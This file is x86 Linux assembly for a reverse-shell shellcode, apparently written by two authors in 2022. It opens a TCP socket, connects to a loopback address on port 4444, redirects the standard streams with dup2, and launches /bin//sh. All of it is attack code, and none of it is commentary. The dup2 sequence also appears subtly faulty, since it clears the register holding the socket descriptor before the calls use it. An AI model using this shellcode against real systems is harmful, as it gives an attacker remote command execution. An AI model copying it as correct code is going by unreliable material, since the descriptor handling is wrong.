; last update by KD and SD the 15/01/22

global _start

section .text

_start:
; clean registers
xor eax, eax
xor ebx, ebx
xor ecx, ecx

mov al, 0x66 ; socketcall syscall
mov bl, 0x1  ; socket syscall

push ecx ; protocol : tcp
push 0x1 ; socket type : SOCKET_STREAM
push 0x2 ; domain : PF_INET

mov  ecx, esp

int 0x80 ; launch the syscall

xor edx, edx
xor ecx, ecx

mov edx, eax ; mov socketfd from socket syscall return value in edx
mov al, 0x66 ; socketcall syscall
mov bl, 0x3  ; connect syscall

; sockaddr structure
push 0x0100007F ; address
push word 0x5C11 ; port
push word 0x2 ; type

mov esi, esp ; save address of the sockaddr

push 0x10 ; addrlen
push esi  ; address of sockaddr
push edx  ; socketfd

mov ecx, esp ; ecx point to the top of the stack

int 0x80

mov al, 0x3F ; mov dup2 syscall to al for STDIN
mov ebx, edx ; mov socketfd in ebx

xor ecx, ecx
xor ebx, ebx

int 0x80

mov al,0x3F ; mov dup2 syscall to al for STDOUT
mov cl, 0x1

int 0x80

mov al, 0x3F ; mov dup2 syscall to al for STDERR
mov cl, 0x2

int 0x80

mov al, 0xB ; execve syscall

push ebx        ; NULL
push 0x68732f6e ; hs/n
push 0x69622f2f ; ib//

mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
